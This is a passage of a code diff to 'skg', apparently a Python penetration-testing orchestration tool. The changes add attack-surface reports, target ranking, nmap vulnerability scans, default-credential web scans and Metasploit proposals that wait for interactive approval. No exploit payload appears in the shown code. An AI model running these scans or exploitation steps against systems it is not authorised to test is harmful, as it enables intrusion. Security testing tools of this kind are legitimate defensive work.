+    services = target.get("services", []) or []
+    domains = set(target.get("domains", []) or [])
+    ports = {svc.get("port") for svc in services}
+    names = {(svc.get("service") or "").lower() for svc in services}
+    return {
+        "externally_observable_only": bool(services) and not any(p in {22, 139, 445, 3306, 5432} for p in ports),
+        "network_reachable_only": (target.get("kind") or target.get("os")) == "external-web",
+        "host_semantics_unconfirmed": 22 not in ports and "host" not in domains,
+        "container_semantics_present": "container_escape" in domains,
+        "data_semantics_present": "data_pipeline" in domains or any(p in {3306, 5432, 6379, 27017} for p in ports),
+        "interactive_surface_present": any(p in {80, 443, 8080, 8443, 8008, 8009} for p in ports),
+        "auth_surface_present": any("auth" in n or p in {22, 443} for n, p in [(svc.get("service", "").lower(), svc.get("port")) for svc in services]),
+        "service_names": sorted(n for n in names if n),
+    }
+
+
+def _print_substrate_self_audit():
+    print("  Substrate Self-Audit:")
+
+    resonance = _api("GET", "/resonance/status") or {}
+    feedback = _api("GET", "/feedback/status") or {}
+    graph = _api("GET", "/graph/status") or {}
+    folds = _api("GET", "/folds") or {}
+    ollama = _api("GET", "/resonance/ollama/status") or {}
+
+    resonance_memory = resonance.get("memory", {})
+    observations = resonance_memory.get("observations") or {}
+    pending_obs = observations.get("pending_observations", 0)
+    confirmation_rate = observations.get("confirmation_rate")
+    confirmation_display = "n/a" if confirmation_rate is None else f"{confirmation_rate:.3f}"
+
+    if resonance:
+        print(f"    resonance.ready        : {'yes' if resonance.get('ready') else 'no'}")
+        print(f"    resonance.memory       : wickets={resonance_memory.get('wickets', 0)} adapters={resonance_memory.get('adapters', 0)} domains={resonance_memory.get('domains', 0)}")
+    else:
+        print("    resonance.ready        : offline")
+
+    print(f"    observations.pending   : {pending_obs}")
+    print(f"    recall.confirmation    : {confirmation_display}")
+
+    if feedback:
+        print(f"    feedback.processed     : {feedback.get('processed_interps', 0)}")
+        print(f"    feedback.last_run      : {feedback.get('last_run') or 'never'}")
+    else:
+        print("    feedback.status        : offline")
+
+    if graph:
+        edge_count = graph.get("edge_count", graph.get("edges", "?"))
+        node_count = graph.get("node_count", graph.get("nodes", "?"))
+        print(f"    graph.state            : nodes={node_count} edges={edge_count}")
+
+    fold_summary = _choose_fold_summary(folds)
+    print(f"    folds.active           : {fold_summary.get('total', 0)}")
+    by_type = fold_summary.get("by_type", {})
+    if by_type:
+        print("    folds.by_type          : " + ", ".join(f"{k}={v}" for k, v in sorted(by_type.items())))
+
+    backlog = _proposal_backlog()
+    print(f"    proposals.pending      : {backlog['pending_total']}")
+    print(f"    proposals.toolchains   : {backlog['pending_toolchain_generation']}")
+    print(f"    proposals.growth       : {backlog['pending_catalog_growth']}")
+    print(f"    proposals.actions      : {backlog['pending_field_action']}")
+    print(f"    proposals.errors       : {backlog['error_total']}")
+
+    pearls_path = SKG_STATE_DIR / "pearls.jsonl"
+    if pearls_path.exists():
+        try:
+            pearl_count = sum(1 for line in pearls_path.read_text(errors='replace').splitlines() if line.strip())
+        except Exception:
+            pearl_count = "?"
+        print(f"    pearls.persisted       : {pearl_count}")
+    else:
+        print("    pearls.persisted       : 0 (ledger not yet persisted)")
+
+    if ollama:
+        models = ollama.get("models", [])
+        selected = ollama.get("selected_model") or "(none)"
+        available = "yes" if ollama.get("available") else "no"
+        models_display = ", ".join(models[:3]) if models else "none"
+        print(f"    ollama.available       : {available}")
+        print(f"    ollama.selected        : {selected}")
+        print(f"    ollama.models          : {models_display}")
+    else:
+        print("    ollama.status          : offline")
+
+
+def _build_substrate_self_audit() -> dict:
+    resonance = _api("GET", "/resonance/status") or {}
+    feedback = _api("GET", "/feedback/status") or {}
+    graph = _api("GET", "/graph/status") or {}
+    folds = _api("GET", "/folds") or {}
+    ollama = _api("GET", "/resonance/ollama/status") or {}
+    fold_summary = _choose_fold_summary(folds)
+    backlog = _proposal_backlog()
+    pearls_path = SKG_STATE_DIR / "pearls.jsonl"
+    pearl_count = 0
+    if pearls_path.exists():
+        try:
+            pearl_count = sum(1 for line in pearls_path.read_text(errors='replace').splitlines() if line.strip())
+        except Exception:
+            pearl_count = 0
+    return {
+        "resonance": resonance,
+        "feedback": feedback,
+        "graph": graph,
+        "folds": fold_summary,
+        "proposals": backlog,
+        "pearls": {"persisted": pearl_count},
+        "ollama": ollama,
+    }
 
 
 def cmd_surface(a):
@@ -221,7 +1125,16 @@ def cmd_surface(a):
         print("  No surface data. Run: skg target add-subnet <cidr>")
         return
 
-    surface = json.loads(Path(surface_path).read_text())
+    try:
+        gravity_runtime = _load_module_from_file(
+            "skg_gravity_runtime_surface",
+            SKG_HOME / "skg-gravity" / "gravity_field.py",
+        )
+        surface = gravity_runtime._hydrate_surface_from_latest_nmap(surface_path)
+        if not surface:
+            surface = json.loads(Path(surface_path).read_text())
+    except Exception:
+        surface = json.loads(Path(surface_path).read_text())
 
     print(f"\n{'='*70}")
     print(f"  SKG ATTACK SURFACE")
@@ -236,7 +1149,8 @@ def cmd_surface(a):
         if not ws and not t.get("services"):
             continue
 
-        print(f"  {ip}  [{t.get('os', '?'):8s}]  {services}")
+        display_kind = t.get("kind") or t.get("os", "?")
+        print(f"  {ip}  [{display_kind:8s}]  {services}")
         print(f"  {'':18s}  domains: {domains}")
 
         if ws:
@@ -250,28 +1164,459 @@ def cmd_surface(a):
         print()
 
     # Show projection results if we have interp files
-    interp_files = glob.glob(str(DISCOVERY_DIR / "*interp*.ndjson")) + glob.glob("/tmp/*interp*.ndjson")
+    interp_files = (
+        glob.glob(str(SKG_STATE_DIR / "interp" / "*_interp.ndjson")) +
+        glob.glob(str(SKG_STATE_DIR / "interp" / "*.json")) +
+        glob.glob(str(DISCOVERY_DIR / "*interp*.ndjson")) +
+        glob.glob("/tmp/*interp*.ndjson")
+    )
+    interp_files = sorted(set(interp_files), key=os.path.getmtime, reverse=True)
     if interp_files:
         print(f"  {'─'*66}")
         print(f"  Attack Path Projections:")
-        seen = set()
+        best_by_apid = {}
         for ef in interp_files:
             try:
-                with open(ef) as f:
-                    for line in f:
-                        rec = json.loads(line.strip())
-                        apid = rec.get("attack_path_id", "")
-                        if apid in seen:
-                            continue
-                        seen.add(apid)
-                        cls = rec.get("classification", "?")
-                        score = rec.get("aprs", 0)
-                        realized = rec.get("realized", [])
-                        marker = "✓" if cls == "realized" else "~" if cls == "indeterminate" else "✗"
-                        print(f"    {marker} {apid:45s} {cls:15s} {score:.0%}")
+                recs = []
+                if ef.endswith(".json"):
+                    recs = [json.loads(Path(ef).read_text())]
+                else:
+                    with open(ef) as f:
+                        recs = [json.loads(line.strip()) for line in f if line.strip()]
+                for rec in recs:
+                    payload = _interp_payload(rec)
+                    apid = payload.get("attack_path_id", "")
+                    if not apid:
+                        continue
+                    current = best_by_apid.get(apid)
+                    rank = _projection_rank(payload)
+                    if current is None or rank > current[0]:
+                        best_by_apid[apid] = (rank, payload)
             except Exception:
                 continue
+        for apid, (_, payload) in best_by_apid.items():
+            cls = payload.get("classification", "?")
+            score = payload.get("aprs", payload.get("lateral_score",
+                    payload.get("escape_score", payload.get("host_score",
+                    payload.get("web_score", payload.get("ai_score", 0))))))
+            marker = "✓" if cls == "realized" else "~" if cls == "indeterminate" else "✗"
+            print(f"    {marker} {apid:45s} {cls:15s} {score:.0%}")
     print()
+
+
+def cmd_report(a):
+    surface_path = _latest_surface()
+    if not surface_path:
+        print("  No surface data. Run: skg target add-subnet <cidr>")
+        return
+
+    try:
+        gravity_runtime = _load_module_from_file(
+            "skg_gravity_runtime_report",
+            SKG_HOME / "skg-gravity" / "gravity_field.py",
+        )
+        surface = gravity_runtime._hydrate_surface_from_latest_nmap(surface_path)
+        if not surface:
+            surface = json.loads(Path(surface_path).read_text())
+    except Exception:
+        surface = json.loads(Path(surface_path).read_text())
+
+    target_filter = getattr(a, "target", None)
+    at_ts = _parse_report_timestamp(getattr(a, "at", None))
+    diff_ts = _parse_report_timestamp(getattr(a, "diff_against", None))
+    targets = surface.get("targets", [])
+    if target_filter:
+        targets = [
+            t for t in targets
+            if t.get("ip") == target_filter or t.get("hostname") == target_filter
+        ]
+        if not targets:
+            print(f"  Target not found in surface: {target_filter}")
+            return
+
+    fold_result = _api("GET", "/folds") or {"folds": []}
+    all_folds = _choose_fold_rows(fold_result)
+    if target_filter:
+        filtered = []
+        for f in all_folds:
+            target_ip = f.get("target_ip")
+            location = str(f.get("location", ""))
+            if target_ip == target_filter or target_filter in location:
+                filtered.append(f)
+        all_folds = filtered
+
+    sys.path.insert(0, str(SKG_HOME))
+    from skg.forge import proposals as _forge_proposals
+    proposals = _forge_proposals.list_proposals(status="all")
+    if target_filter:
+        proposals = [
+            p for p in proposals
+            if target_filter in json.dumps(p)
+        ]
+
+    pearls = []
+    pearls_path = SKG_STATE_DIR / "pearls.jsonl"
+    if pearls_path.exists():
+        for line in pearls_path.read_text(errors="replace").splitlines()[-100:]:
+            if not line.strip():
+                continue
+            try:
+                pearl = json.loads(line)
+            except Exception:
+                continue
+            if target_filter and pearl.get("energy_snapshot", {}).get("target_ip") != target_filter:
+                continue
+            pearls.append(pearl)
+
+    report = {
+        "generated_at": _iso_now(),
+        "surface": Path(surface_path).name,
+        "target_filter": target_filter,
+        "targets": [],
+        "summary": {
+            "target_count": len(targets),
+            "targets_with_unknowns": 0,
+            "total_unknown": 0,
+            "total_realized": 0,
+            "total_blocked": 0,
+        },
+        "folds": {
+            "count": len(all_folds),
+            "high_weight": sorted(
+                all_folds,
+                key=lambda f: float(f.get("gravity_weight", 0.0)),
+                reverse=True,
+            )[:10],
+        },
+        "proposals": {
+            "count": len(proposals),
+            "pending": sum(1 for p in proposals if p.get("status") == "pending"),
+            "accepted_preserved_existing": sum(1 for p in proposals if p.get("status") == "accepted_preserved_existing"),
+            "active": [
+                p for p in proposals
+                if p.get("status") in {"pending", "triggered", "accepted_preserved_existing"}
+            ][:8],
+            "history": [
+                p for p in proposals
+                if p.get("status") not in {"pending", "triggered", "accepted_preserved_existing"}
+            ][:8],
+            "recent": proposals[:12],
+        },
+        "pearls": {
+            "count": len(pearls),
+            "recent": pearls[-10:],
+            "clusters": _cluster_pearls(pearls[-25:]),
+        },
+        "recall": _load_recall_summary(target_filter=target_filter),
+        "self_audit": _build_substrate_self_audit(),
+    }
+
+    kernel_states_by_target = {}
+    if target_filter:
+        try:
+            from skg.kernel.engine import KernelStateEngine
+            kernel_engine = KernelStateEngine(
+                discovery_dir=DISCOVERY_DIR,
+                events_dir=SKG_STATE_DIR / "events",
+                cve_dir=CVE_DIR,
+            )
+            kernel_states_by_target[target_filter] = kernel_engine.states_with_detail(target_filter)
+        except Exception:
+            kernel_states_by_target = {}
+
+    for t in targets:
+        ws = kernel_states_by_target.get(t.get("ip")) or t.get("wicket_states", {})
+        realized = [k for k, v in ws.items() if v == "realized" or (isinstance(v, dict) and v.get("status") == "realized")]
+        blocked = [k for k, v in ws.items() if v == "blocked" or (isinstance(v, dict) and v.get("status") == "blocked")]
+        unknown = [k for k, v in ws.items() if v == "unknown" or (isinstance(v, dict) and v.get("status") == "unknown")]
+        unresolved_rows = [v for v in ws.values() if isinstance(v, dict) and v.get("status") == "unknown"]
+        compatibility_values = [float(v.get("compatibility_score", 0.0) or 0.0) for v in unresolved_rows]
+        decoherence_values = [float(v.get("decoherence", 0.0) or 0.0) for v in unresolved_rows]
+        unresolved_reasons: dict[str, int] = {}
+        for row in unresolved_rows:
+            reason = str(row.get("unresolved_reason") or "unmeasured")
+            unresolved_reasons[reason] = unresolved_reasons.get(reason, 0) + 1
+        report["targets"].append({
+            "ip": t.get("ip"),
+            "kind": t.get("kind") or t.get("os"),
+            "domains": t.get("domains", []),
+            "services": t.get("services", []),
+            "realized_count": len(realized),
+            "blocked_count": len(blocked),
+            "unknown_count": len(unknown),
+            "unresolved_reasons": unresolved_reasons,
+            "compatibility_score_mean": round(sum(compatibility_values) / len(compatibility_values), 3) if compatibility_values else 0.0,
+            "decoherence_total": round(sum(decoherence_values), 3),
+            "realized_sample": sorted(realized)[:15],
+        })
+        report["summary"]["total_unknown"] += len(unknown)
+        report["summary"]["total_realized"] += len(realized)
+        report["summary"]["total_blocked"] += len(blocked)
+        if unknown:
+            report["summary"]["targets_with_unknowns"] += 1
+
+    if target_filter and report["targets"]:
+        scoped_target = report["targets"][0]
+        scoped_folds = report["folds"]["high_weight"][:5]
+        scoped_proposals = report["proposals"]["recent"][:6]
+        report["interpretation"] = {
+            "identity_properties": _active_identity_properties({
+                "identity_properties": _infer_identity_properties_from_target(scoped_target),
+            }),
+            "evidence": [
+                f"{svc.get('port')}/{svc.get('service')}"
+                for svc in scoped_target.get("services", [])[:8]
+            ],
+            "top_mismatch": _fold_brief_why(scoped_folds[0]) if scoped_folds else None,
+            "hypotheses": list((scoped_folds[0].get("hypotheses", []) if scoped_folds else [])[:3]),
+            "next_collapse": _describe_next_collapse(scoped_target, scoped_folds, scoped_proposals),
+            "recent_memory": [c.get("summary") for c in report["pearls"]["clusters"][-3:]],
+        }
+    else:
+        report["interpretation"] = None
+
+    if getattr(a, "json_out", False):
+        print(json.dumps(report, indent=2))
+        return
+
+    historical_pearl = _load_target_snapshot_from_pearls(target_filter, at_ts=at_ts) if target_filter and at_ts else None
+    historical_snapshot = (historical_pearl or {}).get("target_snapshot") if historical_pearl else None
+    diff_pearl = _load_target_snapshot_from_pearls(target_filter, at_ts=diff_ts) if target_filter and diff_ts else None
+    diff_snapshot = (diff_pearl or {}).get("target_snapshot") if diff_pearl else None
+
+    print(f"\n{'='*70}")
+    print("  SKG REPORT")
+    print(f"{'='*70}")
+    print(f"  Generated : {report['generated_at']}")
+    print(f"  Surface   : {report['surface']}")
+    if target_filter:
+        print(f"  Target    : {target_filter}")
+        if at_ts:
+            print(f"  As-Of     : {at_ts.isoformat()}")
+            if not historical_snapshot:
+                print("  Note      : no pearl-backed target snapshot exists for that time yet; showing current surface with historical scope only")
+    else:
+        print(f"  Targets   : {report['summary']['target_count']} total, {report['summary']['targets_with_unknowns']} with unresolved state")
+        print(f"  State     : {report['summary']['total_realized']} realized, {report['summary']['total_blocked']} blocked, {report['summary']['total_unknown']} unknown")
+    print()
+
+    if historical_snapshot:
+        historical_services = ", ".join(
+            f"{svc.get('port')}/{svc.get('service')}"
+            for svc in historical_snapshot.get("services", [])[:12]
+        ) or "none"
+        print("  Historical Snapshot:")
+        print(f"    kind     : {historical_snapshot.get('kind','?')}")
+        print(f"    domains  : {', '.join(historical_snapshot.get('domains', [])) or 'none'}")
+        print(f"    services : {historical_services}")
+        props = historical_snapshot.get("identity_properties", {}) or {}
+        if props:
+            active_props = [k for k, v in props.items() if v is True]
+            if active_props:
+                print(f"    properties: {', '.join(active_props[:8])}")
+        print()
+
+    ranked_targets = sorted(
+        report["targets"],
+        key=lambda t: (t["unknown_count"], t["blocked_count"], t["realized_count"]),
+        reverse=True,
+    )
+
+    if not target_filter:
+        print("  Priority Targets:")
+        for t in ranked_targets[:5]:
+            services = ", ".join(f"{s.get('port')}/{s.get('service')}" for s in t.get("services", [])[:8]) or "none"
+            domains = ", ".join(t.get("domains", [])) or "none"
+            print(f"    {t['ip']:18s} [{(t.get('kind') or '?'):12s}] {t['unknown_count']}U {t['blocked_count']}B {t['realized_count']}R")
+            print(f"      services: {services}")
+            print(f"      domains : {domains}")
+        print()
+
+    for t in ranked_targets if target_filter else ranked_targets[:3]:
+        services = ", ".join(f"{s.get('port')}/{s.get('service')}" for s in t.get("services", [])[:12])
+        domains = ", ".join(t.get("domains", []))
+        print(f"  {t['ip']}  [{(t.get('kind') or '?'):12s}]")
+        print(f"    services : {services}")
+        print(f"    domains  : {domains}")
+        print(f"    state    : {t['realized_count']} realized, {t['blocked_count']} blocked, {t['unknown_count']} unknown")
+        if t.get("unknown_count"):
+            reasons = t.get("unresolved_reasons", {}) or {}
+            if reasons:
+                reason_text = ", ".join(f"{k}={v}" for k, v in sorted(reasons.items()))
+                print(f"    unresolved: {reason_text}")
+            print(f"    measurement: compatibility={float(t.get('compatibility_score_mean', 0.0)):.3f} decoherence={float(t.get('decoherence_total', 0.0)):.3f}")
+        if t.get("realized_sample"):
+            print(f"    realized : {', '.join(t['realized_sample'][:10])}")
+        print()
+
+    if target_filter and report.get("interpretation"):
+        interp = report["interpretation"]
+        print("  Interpretation:")
+        props = ", ".join(interp.get("identity_properties", [])[:8]) or "no strong identity properties yet"
+        evidence = ", ".join(interp.get("evidence", [])[:8]) or "no direct service evidence yet"
+        print(f"    identity : {props}")
+        print(f"    evidence : {evidence}")
+        if interp.get("top_mismatch"):
+            print(f"    mismatch : {interp['top_mismatch']}")
+        for hyp in interp.get("hypotheses", [])[:2]:
+            print(f"    maybe    : {hyp[:120]}")
+        for mem in interp.get("recent_memory", [])[:2]:
+            print(f"    memory   : {mem}")
+        print(f"    next     : {interp.get('next_collapse')}")
+        print()
+
+    if target_filter and diff_snapshot and report["targets"]:
+        current_snapshot = {
+            "ip": report["targets"][0].get("ip"),
+            "kind": report["targets"][0].get("kind"),
+            "domains": report["targets"][0].get("domains", []),
+            "services": report["targets"][0].get("services", []),
+            "identity_properties": _infer_identity_properties_from_target(report["targets"][0]),
+        }
+        diff = _diff_target_snapshots(diff_snapshot, current_snapshot)
+        print(f"  Diff vs {diff_ts.isoformat()}:")
+        if diff.get("domains_added") or diff.get("domains_removed"):
+            print(f"    domains  : +{', '.join(diff.get('domains_added', [])) or 'none'}  -{', '.join(diff.get('domains_removed', [])) or 'none'}")
+        if diff.get("services_added") or diff.get("services_removed"):
+            print(f"    services : +{', '.join(diff.get('services_added', [])) or 'none'}  -{', '.join(diff.get('services_removed', [])) or 'none'}")
+        for change in diff.get("property_changes", [])[:6]:
+            print(f"    property : {change['property']}  {change['before']} -> {change['after']}")
+        print()
+
+    print(f"  Folds      : {report['folds']['count']}")
+    for fold in report["folds"]["high_weight"][:5]:
+        print(f"    {fold.get('target_ip','?')} [{fold.get('fold_type','?')}] Φ={float(fold.get('gravity_weight',0.0)):.2f} {fold.get('detail','')[:80]}")
+    print()
+
+    print(f"  Proposals  : {report['proposals']['count']} total, {report['proposals']['pending']} pending")
+    active_props = report["proposals"]["active"]
+    history_props = report["proposals"]["history"]
+    if active_props:
+        print("    active:")
+    for proposal in active_props[:4]:
+        print(f"      {proposal.get('id','')[:12]} {proposal.get('status',''):22s} {proposal.get('proposal_kind',''):16s} {proposal.get('description','')[:70]}")
+        growth = ((proposal.get("recall") or {}).get("growth_memory") or {})
+        reasons = growth.get("proposal_reasons", []) or []
+        if reasons:
+            print(f"        memory   growth={growth.get('delta', 0.0):.3f} via {', '.join(reasons[:4])}")
+    if history_props:
+        print("    recent history:")
+    for proposal in history_props[:4]:
+        print(f"    {proposal.get('id','')[:12]} {proposal.get('status',''):22s} {proposal.get('proposal_kind',''):16s} {proposal.get('description','')[:70]}")
+    print()
+
+    recall = report["recall"]
+    print(f"  Recall     : {recall['confirmed']} confirmed, {recall['pending']} pending", end="")
+    if recall["confirmation_rate"] is not None:
+        print(f", confirmation={recall['confirmation_rate']:.3f}")
+    else:
+        print()
+    for dom in recall["by_domain"][:4]:
+        rate = dom["confirmation_rate"]
+        rate_s = f"{rate:.3f}" if rate is not None else "n/a"
+        print(f"    {dom['domain']:16s} confirmed={dom['confirmed']:<3d} realized={dom['realized']:<3d} rate={rate_s}")
+    for rec in recall["recent"][:3]:
+        print(f"    recent {str(rec.get('workload_id','?')):20s} {str(rec.get('projection_confirmed','?')):10s} "
+              f"{str(rec.get('wicket_id') or '?'):12s} {rec.get('evidence_text','')[:72]}")
+    print()
+
+    print(f"  Pearls     : {report['pearls']['count']} recent for scope")
+    for cluster in report["pearls"]["clusters"][-5:]:
+        start_ts = str(cluster.get("start_ts", "?")).replace("T", " ")[:19]
+        end_ts = str(cluster.get("end_ts", "?")).replace("T", " ")[:19]
+        span = start_ts if start_ts == end_ts else f"{start_ts} -> {end_ts}"
+        print(f"    {span:41s} {cluster.get('summary','')}")
+    print(f"  Self-audit : folds={report['self_audit']['folds'].get('total',0)} pending_proposals={report['self_audit']['proposals'].get('pending_total',0)} persisted_pearls={report['self_audit']['pearls'].get('persisted',0)}")
+    if not target_filter:
+        print(f"  Views      : skg report --target <ip> | skg surface | skg web | skg status --self-audit")
+    print()
+
+    if getattr(a, "llm", False):
+        try:
+            from skg.resonance.ollama_backend import OllamaBackend
+            backend = OllamaBackend()
+            if backend.available():
+                llm_view = {
+                    "generated_at": report["generated_at"],
+                    "surface": report["surface"],
+                    "target_filter": report["target_filter"],
+                    "targets": [
+                        {
+                            "ip": t.get("ip"),
+                            "kind": t.get("kind"),
+                            "domains": t.get("domains", []),
+                            "services": [
+                                f"{svc.get('port')}/{svc.get('service')}"
+                                for svc in t.get("services", [])[:12]
+                            ],
+                            "state": {
+                                "realized": t.get("realized_count", 0),
+                                "blocked": t.get("blocked_count", 0),
+                                "unknown": t.get("unknown_count", 0),
+                            },
+                            "realized_sample": t.get("realized_sample", [])[:8],
+                        }
+                        for t in report["targets"][:3]
+                    ],
+                    "folds": [
+                        {
+                            "target": f.get("target_ip"),
+                            "type": f.get("fold_type"),
+                            "weight": float(f.get("gravity_weight", 0.0)),
+                            "detail": (f.get("detail", "")[:160]),
+                        }
+                        for f in report["folds"]["high_weight"][:5]
+                    ],
+                    "proposals": {
+                        "count": report["proposals"]["count"],
+                        "pending": report["proposals"]["pending"],
+                        "accepted_preserved_existing": report["proposals"]["accepted_preserved_existing"],
+                        "recent": [
+                            {
+                                "id": p.get("id", "")[:12],
+                                "status": p.get("status"),
+                                "kind": p.get("proposal_kind"),
+                                "description": (p.get("description", "")[:120]),
+                                "growth_memory": ((p.get("recall") or {}).get("growth_memory") or {}),
+                            }
+                            for p in report["proposals"]["recent"][:6]
+                        ],
+                    },
+                    "pearls": {
+                        "count": report["pearls"]["count"],
+                    },
+                    "recall": {
+                        "confirmed": report["recall"]["confirmed"],
+                        "pending": report["recall"]["pending"],
+                        "confirmation_rate": report["recall"]["confirmation_rate"],
+                        "by_domain": report["recall"]["by_domain"][:4],
+                        "recent": report["recall"]["recent"][:3],
+                    },
+                    "self_audit": {
+                        "folds": report["self_audit"]["folds"].get("total", 0),
+                        "pending_proposals": report["self_audit"]["proposals"].get("pending_total", 0),
+                        "persisted_pearls": report["self_audit"]["pearls"].get("persisted", 0),
+                        "ollama_model": report["self_audit"]["ollama"].get("selected"),
+                    },
+                }
+                llm_prompt = (
+                    "You are summarizing SKG substrate state. "
+                    "Use 4-6 short bullets. Be concise and factual. "
+                    "Do not invent findings. Mention target state, major folds, proposal state, "
+                    "and what matters next.\n\n"
+                    + json.dumps(llm_view, indent=2)
+                )
+                summary = backend.generate(llm_prompt, num_predict=192)
+                print("  TinyLlama Summary:")
+                for line in summary.strip().splitlines()[:12]:
+                    print(f"    {line}")
+                print()
+            else:
+                print("  TinyLlama Summary: ollama unavailable")
+                print()
+        except Exception as exc:
+            print(f"  TinyLlama Summary failed: {exc}")
+            print()
 
 
 def cmd_web_view(a):
@@ -283,6 +1628,9 @@ def cmd_web_view(a):
 
     surface = json.loads(Path(surface_path).read_text())
     targets = surface.get("targets", [])
+    fold_rows = _choose_fold_rows(_api("GET", "/folds") or {})
+    backlog = _proposal_backlog()
+    ranked = _rank_surface_targets(surface, fold_rows)
 
     # Auto-discover bonds from observed topology
     bonds = []
@@ -383,6 +1731,19 @@ def cmd_web_view(a):
     print(f"  GRAVITY WEB — {len(targets)} nodes, {len(bond_map)} bonds")
     print(f"{'='*70}\n")
 
+    print("  Field Context:")
+    for row in ranked[:5]:
+        services = ", ".join(f"{s.get('port')}/{s.get('service')}" for s in row["services"][:6]) or "none"
+        domains = ", ".join(row["domains"]) or "none"
+        fold_note = f", folds={row['folds']} (+{row['fold_weight']:.1f})" if row["folds"] else ""
+        print(f"    {row['ip']:18s} [{row['kind']}] E≈{row['priority']:.1f} unk={row['unknown']}{fold_note}")
+        print(f"      services: {services}")
+        print(f"      domains : {domains}")
+    print(f"    proposals: pending={backlog['pending_total']} toolchains={backlog['pending_toolchain_generation']} growth={backlog['pending_catalog_growth']} actions={backlog['pending_field_action']} errors={backlog['error_total']}")
+    print()
+
+    print("  Bonds:")
+
     for (ip1, ip2), (btype, strength, _) in sorted(bond_map.items(), key=lambda x: -x[1][1]):
         print(f"  {ip1:18s} ←─{btype:14s}─→ {ip2:18s}  strength: {strength:.2f}")
 
@@ -396,9 +1757,10 @@ def cmd_target(a):
 
     if subcmd == "add":
         print(f"  Adding target: {a.ip}")
-        # For now, just add to targets.yaml if it exists
-        targets_file = Path("/etc/skg/targets.yaml")
+        surface_path = _register_target(a.ip, getattr(a, "domain", None))
         print(f"  Target registered. Run 'skg observe {a.ip}' to begin observation.")
+        if surface_path:
+            print(f"  Surface updated: {Path(surface_path).name}")
         print(f"  Or run 'skg gravity' to let the field direct instruments.")
 
     elif subcmd == "add-subnet":
@@ -446,8 +1808,9 @@ def cmd_target(a):
 
 # ── Observation commands ─────────────────────────────────────────────────
 def _queue_msf_proposal(ip: str):
-    sys.path.insert(0, "/opt/skg")
-    from skg.forge.proposals import create_action
+    if str(REPO_ROOT) not in sys.path:
+        sys.path.insert(0, str(REPO_ROOT))
+    from skg.forge.proposals import create_action, interactive_review
 
     out_dir = DISCOVERY_DIR
     out_dir.mkdir(parents=True, exist_ok=True)
@@ -520,13 +1883,27 @@ def _queue_msf_proposal(ip: str):
     print(f"  [MSF] Proposal queued: {proposal['id']}")
     print(f"  [MSF] RC script: {rc_file}")
     print(f"  [MSF] Trigger after approval: skg proposals trigger {proposal['id']}")
+    review = interactive_review(proposal["id"])
+    if review.get("decision") == "approved":
+        print(f"  [MSF] Approved interactively: {proposal['id']}")
+    elif review.get("decision") == "rejected":
+        print(f"  [MSF] Rejected interactively: {proposal['id']}")
+    elif review.get("decision") == "deferred":
+        print(f"  [MSF] Deferred interactively: {proposal['id']}")
 
 
 def cmd_observe(a):
     """Trigger observation on a target — gravity selects instrument, or operator specifies."""
-    ip = a.ip
+    raw_target = a.ip
     instrument = getattr(a, "instrument", None)
     auth = getattr(a, "auth", False)
+    parsed = urlparse(raw_target) if "://" in raw_target else None
+    is_url = parsed is not None and parsed.scheme in ("http", "https") and bool(parsed.netloc)
+    ip = parsed.hostname if is_url else raw_target
+    target_url = raw_target.rstrip("/") if is_url else None
+
+    if is_url and instrument is None:
+        instrument = "web"
 
     if instrument == "web" and auth:
         # Authenticated web scan
@@ -534,8 +1911,9 @@ def cmd_observe(a):
         if not script.exists():
             print(f"  Error: {script} not found")
             return
-        events_file = DISCOVERY_DIR / f"observe_auth_{ip}.ndjson"
-        args = [str(script), "--target", f"http://{ip}", "--try-defaults",
+        safe_host = (ip or "target").replace(":", "_")
+        events_file = DISCOVERY_DIR / f"observe_auth_{safe_host}.ndjson"
+        args = [str(script), "--target", target_url or f"http://{ip}", "--try-defaults",
                 "--out", str(events_file)]
         subprocess.call([sys.executable] + args)
 
@@ -545,13 +1923,22 @@ def cmd_observe(a):
         if not script.exists():
             print(f"  Error: {script} not found")
             return
-        events_file = DISCOVERY_DIR / f"observe_web_{ip}.ndjson"
-        # Find web port
-        port = _find_web_port(ip)
-        scheme = "http"
-        args = [str(script), "--target", f"{scheme}://{ip}:{port}",
-                "--out", str(events_file), "--attack-path-id", "web_sqli_to_shell_v1"]
+        safe_host = (ip or "target").replace(":", "_")
+        events_file = DISCOVERY_DIR / f"observe_web_{safe_host}.ndjson"
+        if target_url:
+            resolved_target = target_url
+            attack_path_id = "web_surface_v1"
+        else:
+            port = _find_web_port(ip)
+            scheme = "http"
+            resolved_target = f"{scheme}://{ip}:{port}"
+            attack_path_id = "web_sqli_to_shell_v1"
+        args = [str(script), "--target", resolved_target,
+                "--out", str(events_file), "--attack-path-id", attack_path_id]
         subprocess.call([sys.executable] + args)
+        if target_url and events_file.exists():
+            surface_path = _register_web_observation_target(resolved_target, events_file)
+            print(f"  Surface updated: {Path(surface_path).name}")
 
     elif instrument == "ssh":
         # Direct SSH collection — hits the daemon /collect endpoint
@@ -591,9 +1978,10 @@ def cmd_observe(a):
 
     elif instrument == "nmap":
         events_file = DISCOVERY_DIR / f"observe_nmap_{ip}.xml"
-        port = _find_web_port(ip) or "1-1024"
+        ports = _target_ports(ip)
+        port = ",".join(str(p) for p in ports) if ports else "1-1024"
         print(f"  [NMAP] Scanning {ip}...")
-        subprocess.call(["nmap", "-sV", "--script=default,vuln",
+        subprocess.call(["nmap", "-Pn", "-sV", "--script=default,vuln",
                          "-p", str(port), "-oX", str(events_file), ip])
 
     elif instrument == "msf":
@@ -610,14 +1998,20 @@ def cmd_observe(a):
 
     else:
         # No instrument specified — let gravity decide
-        print(f"  Observing {ip} — gravity selecting instrument...")
+        print(f"  Observing {raw_target} — gravity selecting instrument...")
         gravity_script = SKG_HOME / "skg-gravity" / "gravity_field.py"
         if gravity_script.exists():
-            # Run one gravity cycle focused on this target
+            target_entry = _surface_target(ip) if not is_url else None
             surface_path = _latest_surface()
+            if not is_url and (target_entry is None or not target_entry.get("services")):
+                print(f"  Bootstrapping network view for {ip}...")
+                try:
+                    surface_path = _bootstrap_target_surface(ip)
+                except Exception as exc:
+                    print(f"  Bootstrap failed: {exc}")
             if surface_path:
                 subprocess.call([sys.executable, str(gravity_script),
-                                 "--surface", surface_path, "--cycles", "1"])
+                                 "--surface", surface_path, "--cycles", "1", "--target", ip])
             else:
                 print("  No surface data. Run: skg target add-subnet <cidr>")
         else:
@@ -640,6 +2034,26 @@ def _find_web_port(ip):
     return 80
 
 
+def _target_ports(ip: str) -> list[int]:
+    surface_path = _latest_surface()
+    if not surface_path:
+        return []
+    try:
+        surface = json.loads(Path(surface_path).read_text())
+    except Exception:
+        return []
+    for t in surface.get("targets", []):
+        if t.get("ip") == ip:
+            ports = []
